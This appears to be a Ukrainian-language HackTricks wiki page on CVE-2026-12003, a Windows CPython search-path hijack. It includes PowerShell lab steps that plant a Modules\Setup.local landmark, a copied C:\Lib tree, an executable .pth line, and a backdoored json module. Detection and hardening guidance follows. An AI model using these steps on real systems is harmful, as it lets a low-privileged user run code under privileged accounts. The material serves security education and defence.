# Windows CPython Build-Landmark і `sys.path` Hijacking

{{#include ../../../banners/hacktricks-training.md}}

Середовище виконання може зберігати відносні шляхи, призначені лише для його дерева збірки. Якщо встановлене привілейоване середовище виконання визначає один із таких шляхів як каталог, доступний для запису користувачу з низькими привілеями, зловмисник може розмістити очікуваний **build landmark** і змусити середовище виконання довіритися альтернативному префіксу бібліотек. CVE-2026-12003 є прикладом для Windows CPython: розміщений `Modules\Setup.local` може перенаправити запис стандартної бібліотеки в `sys.path` без зміни захищеної інсталяції Python.<sup>[[1]](#references)[[2]](#references)</sup>

## Ланцюжок побудови шляхів CPython

Вразливі збірки Windows були скомпільовані з `VPATH=..\..` і відкривали це значення як `sys._vpath`. Вразливий fallback у `Modules/getpath.py` трактував `VPATH\Modules\Setup.local` як ознаку того, що інтерпретатор запущений із дерева вихідного коду; наведений нижче потік даних перетворює це значення часу збірки на примітив пошуку шляхів під час виконання.<sup>[[1]](#references)[[2]](#references)</sup>

| Етап | Отримане значення для `C:\Program Files\Python314\python.exe` |
| --- | --- |
| Скомпільований шлях збірки | `VPATH=..\..` |
| Build landmark під час виконання | `C:\Program Files\Python314\..\..\Modules\Setup.local` |
| Створений зловмисником landmark | `C:\Modules\Setup.local` |
| Вибраний `build_prefix` | `C:\` |
| Вибрана стандартна бібліотека | `C:\Lib` |
| Результат | Контрольований зловмисником `C:\Lib` додається до `sys.path` |

Ця перевірка є fallback, який використовується, коли розташований поруч із виконуваним файлом `pybuilddir.txt` відсутній або недоступний для читання. Це важливо, оскільки користувач із низькими привілеями може не мати змоги змінювати `C:\Program Files\Python314`, але все ще може створювати нові каталоги в `C:\`. Пізніший привілейований процес `python.exe` завантажує код Python, використовуючи власний токен доступу.<sup>[[1]](#references)[[2]](#references)</sup>

### Передумови

Розглядайте це як межу привілеїв лише коли виконуються всі наведені нижче умови:<sup>[[1]](#references)[[2]](#references)</sup>

- Ціллю є вразлива збірка **Windows CPython**; вразлива логіка шляхів не є властивістю мови Python.
- Каталог, отриманий шляхом розгортання `..\..` із каталогу, що містить `python.exe`, дозволяє користувачу з нижчими привілеями створити landmark і дерево `Lib`.
- Користувач із вищими привілеями, служба, інсталятор або обліковий запис розгортання програм згодом запускає цей інтерпретатор.
- Жодна конфігурація ізоляції шляхів не змінює вразливий шлях пошуку.

## Перерахування

Перевірте як скомпільоване значення, так і ефективний шлях пошуку. Наявне значення `..\..` є корисною підказкою, але не доказом можливості експлуатації: також розгорніть шлях, перевірте ACL і підтвердьте, що розміщений landmark буде за межами захищеної інсталяції.<sup>[[1]](#references)[[2]](#references)</sup>
```powershell
python -c "import os,sys; print(sys.executable); print(getattr(sys,'_vpath',None)); print(*sys.path, sep='\n')"

$pythonDir = python -c "import os,sys; print(os.path.dirname(sys.executable))"
$prefix = [IO.Path]::GetFullPath((Join-Path $pythonDir '..\..'))
$prefix
icacls $prefix
```
Не обмежуйте оцінювання лише офіційними інсталяторами. Для кожного продукту, що містить `python.exe`, визначте його `sys._vpath` відносно фактичного каталогу виконуваного файлу та перевірте ACL для отриманих розташувань `Modules` і `Lib`. Глибший шлях інсталяції може вказувати на інший доступний для запису каталог програми або постачальника замість `C:\`.<sup>[[1]](#references)</sup>

## Lab exploitation workflow

Наведений нижче лабораторний PoC відтворює достатню частину легітимного runtime нижче вибраного prefix, щоб Python ініціалізувався, додає виконуваний рядок `.pth`, а потім створює landmark. Створіть payload до landmark, щоб не залишати інтерпретатор тимчасово вказаним на неповне дерево бібліотек.<sup>[[1]](#references)</sup>
```powershell
$pythonDir = python -c "import os,sys; print(os.path.dirname(sys.executable))"
$root = [IO.Path]::GetFullPath((Join-Path $pythonDir '..\..'))
robocopy /E "$pythonDir\Lib" "$root\Lib" | Out-Null
robocopy /E "$pythonDir\DLLs" "$root\Lib" | Out-Null
New-Item "$root\Lib\site-packages" -ItemType Directory -Force | Out-Null
'import subprocess;subprocess.run(["cmd.exe","/c","whoami > %TEMP%\\py-landmark.txt"],shell=False)' |
Set-Content "$root\Lib\site-packages\audit.pth" -Encoding Ascii
New-Item "$root\Modules" -ItemType Directory -Force | Out-Null
New-Item "$root\Modules\Setup.local" -ItemType File -Force | Out-Null
```
Під час звичайної ініціалізації сайту Python обробляє файли `.pth` у розпізнаних директоріях site-packages. Виконуються лише рядки, що починаються з `import`, після якого є пробільний символ, а виконуваний оператор має залишатися в одному фізичному рядку; `python -S` вимикає автоматичний імпорт `site` і, відповідно, цей тригер.<sup>[[1]](#references)[[4]](#references)</sup>

### Альтернатива, ініційована імпортом

Виконання під час запуску не є обов’язковим. Після відтворення легітимного дерева бібліотек додайте backdoor до модуля, який привілейований скрипт передбачувано імпортує. Наприклад, додавання коду до розміщеного `Lib\json\__init__.py` виконується, коли жертва імпортує `json`; вибір надійного, але не універсально імпортованого модуля може зробити тригер менш помітним.<sup>[[1]](#references)</sup>
```powershell
'open(r"C:\Windows\Temp\json-import-token.txt","w").write(__import__("subprocess").check_output(["whoami"]).decode())' |
Add-Content "$root\Lib\json\__init__.py" -Encoding Ascii
```
Цей варіант усе ще успадковує token процесу імпортування, але залежить від того, чи імпортує цільовий застосунок змінений модуль. Під час тестування реального програмного забезпечення зберігайте оригінальну поведінку модуля, інакше імпорт може завершитися помилкою до завершення призначеного привілейованого workflow.<sup>[[1]](#references)</sup>

## Посадка до встановлення

Посадка в search path може відбутися ще до встановлення. Користувач із низькими привілеями може підготувати майбутнє дерево `Lib` і `Modules\Setup.local`, а потім очікувати, поки привілейований software portal, workflow служби підтримки або система розгортання виконає встановлення для всіх користувачів. Інсталятори, які запускають новий interpreter для встановлення пакетів або попередньої компіляції стандартної бібліотеки, можуть активувати payload від імені облікового запису розгортання, навіть якщо адміністратор вручну не відкриває Python.<sup>[[1]](#references)</sup>

Це також змінює підхід до перевірки розгортання: перевіряйте доступні для запису батьківські каталоги та попередньо створені landmark/library directories **до** встановлення або оновлення bundled runtime, а не лише кінцевий каталог встановлення після розгортання.<sup>[[1]](#references)</sup>

## Виявлення та hardening

Корисними точками пошуку на хості є неочікуваний landmark і library tree, після яких відбувається привілейований запуск Python. Шукайте `Modules\Setup.local`, `Lib\site-packages\*.pth` у корені або в інших нетипових місцях, скопійовані пакети стандартної бібліотеки та файли модулів, власник або час створення яких відрізняється від захищеного встановлення. Зіставляйте їх створення звичайним користувачем із підвищеним `python.exe`, який запускає `cmd.exe`, `powershell.exe`, інструменти керування обліковими записами або інші нетипові дочірні процеси.<sup>[[1]](#references)</sup>
```powershell
Get-Item C:\Modules\Setup.local -ErrorAction SilentlyContinue | Format-List FullName,CreationTime,LastWriteTime
Get-ChildItem C:\Lib\site-packages -Filter *.pth -ErrorAction SilentlyContinue |
Select-Object FullName,CreationTime,LastWriteTime
Get-ChildItem C:\Lib -Recurse -File -ErrorAction SilentlyContinue |
Get-Acl | Where-Object Owner -notmatch 'TrustedInstaller|Administrators|SYSTEM'
```
В upstream fix вилучено fallback `VPATH\Modules\Setup.local`, а `pybuilddir.txt` став єдиним індикатором build-tree. Надавайте перевагу фіксованій збірці або інсталяції для окремого користувача, керованій поточним Python install manager. Якщо оновлення тимчасово неможливе, захистіть визначеного предка та заздалегідь створіть `Modules` з обмежувальними ACL; контрольовані файли `._pth` або `PYTHONHOME` також можуть змінити механізм пошуку, але потребують тестування сумісності застосунку.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## References

- [1] [Bishop Fox - CVE-2026-12003: викрадення search-path у Windows CPython та Local Privilege Escalation](https://bishopfox.com/blog/python-software-foundation-python-3-11-0a3-to-3-15-0b2)
- [2] [CPython issue #151544 - search paths у дереві вихідного коду можна ввімкнути без зміни директорії інсталяції](https://github.com/python/cpython/issues/151544)
- [3] [CPython pull request #151545 - вилучення fallback `VPATH/Modules/Setup.local`](https://github.com/python/cpython/pull/151545)
- [4] [Документація Python - файли конфігурації шляхів `site`](https://docs.python.org/3/library/site.html)
{{#include ../../../banners/hacktricks-training.md}}
